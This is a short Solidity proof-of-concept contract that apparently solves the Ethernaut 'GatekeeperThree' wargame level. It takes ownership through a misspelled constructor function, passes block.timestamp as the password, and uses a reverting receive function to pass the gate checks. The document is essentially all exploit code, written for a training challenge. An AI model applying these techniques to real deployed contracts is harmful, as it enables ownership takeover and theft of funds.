// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperThree  {
     function construct0r() external;
     function createTrick() external;
     function getAllowance(uint256 _password) external;
      function enter() external;
}

contract poc{
    address target;
    constructor()payable {
        target=0x83D598631cd6232F55B64774D534ee3B666DA781;
    }

    function attack() public payable {
        require(msg.value > 0.001 ether);
        GatekeeperThree hacker=GatekeeperThree(target);
        hacker.createTrick();
        hacker.construct0r();
        hacker.getAllowance(block.timestamp);
        payable(target).transfer(1000000000000000); 

        hacker.enter();

    }

    function trade() public payable{
        payable(target).transfer(1000000000000000);
    }
    receive() external payable {
        revert();
    }
}
